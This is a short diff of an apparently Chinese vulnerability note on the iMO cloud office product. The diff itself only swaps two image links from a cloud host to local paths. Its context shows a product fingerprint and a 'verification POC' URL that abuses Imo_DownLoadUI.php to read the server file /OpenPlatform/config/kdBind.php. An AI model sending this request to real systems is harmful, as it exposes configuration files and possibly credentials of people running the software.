@@ -20,7 +20,7 @@ app="iMO-云办公室"
 
 登录页面
 
-![image-20220524171455819](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205241714963.png)
+![image-20220524171455819](./images/202205241714963.png)
 
 验证POC
 
@@ -28,4 +28,4 @@ app="iMO-云办公室"
 /file/Placard/upload/Imo_DownLoadUI.php?cid=1&uid=1&type=1&filename=/OpenPlatform/config/kdBind.php
 ```
 
-![image-20220524171627797](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205241716860.png)
+![image-20220524171627797](./images/202205241716860.png)
